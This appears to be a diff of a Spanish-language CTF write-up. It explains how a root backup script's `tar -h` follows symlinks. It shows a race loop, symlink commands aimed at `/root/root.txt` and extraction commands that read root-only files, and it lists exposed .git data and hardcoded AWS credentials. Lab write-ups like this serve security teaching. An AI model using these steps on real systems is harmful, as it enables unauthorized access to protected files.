@@ -253,10 +253,31 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*
 ```
-Vulnerabilidad: Parámetro -h en tar que sigue symlinks.
+Lo que hace este script es:
+
+1. Crea un backup** de `/var/www/app/` en `/opt/backups/`
+
+2. Genera un checksum SHA1** del backup y lo guarda en `/opt/backups/checksum`
+
+3. Espera 5 segundos
+
+4. Crea un backup final que incluye el archivo original + el checksum
+
+5. Usa `tar -h` que sigue symlinks en lugar de ignorarlos
+
+Aqui la vulnerabilidad se encuentra en el parámetro `-h` en el segundo comando tar hace que:
+
+- En lugar de guardar el symlink**, guarda el **CONTENIDO del archivo al que apunta el symlink
+
+- Durante los 5 segundos de sleep, puedes reemplazar `checksum` por un symlink a cualquier archivo
+
+- El backup final contendrá ese archivo con permisos de root
+
+Lo que vamos a hacer es crearnos un script
 
 Explotación
 Crear script de explotación con nano:
+
 ```
 #!/bin/bash
 while true; do 
@@ -270,7 +291,7 @@ while true; do
 done
 EOF
 ```
-https://./images/exploit_script.png
+![pspy](exploit.png)
 
 Dar permisos y ejecutar:
 ```
@@ -281,26 +302,25 @@ Buscar backup más reciente:
 ```
 latest_backup=$(ls -t /var/backups/web_backups/ | head -1) && cp "/var/backups/web_backups/$latest_backup" /tmp/ && cd /tmp && tar -xf "$latest_backup" && cat opt/backups/checksum
 ```
-https://./images/backup_extract.png
+Symlink a root.txt:
 
-Problema: Obtenemos el hash SHA1 en lugar de la clave privada.
-
-Solución - Symlink a root.txt:
 ```
 rm -f /opt/backups/checksum
 ln -s -f /root/root.txt /opt/backups/checksum
 ```
 Extraer root flag:
+
 ```
 latest_backup=$(ls -t /var/backups/web_backups/ | head -1)
 tar -xf "/var/backups/web_backups/$latest_backup" -O opt/backups/checksum
 ```
 Root Flag:
 
-https://./images/root_flag.png
+![pspy](root.png)
 
 Conclusión
 Vulnerabilidades Explotadas
+
 Git Repository Exposure - .git/ accesible públicamente
 
 Hardcoded AWS Credentials - En historial de commits
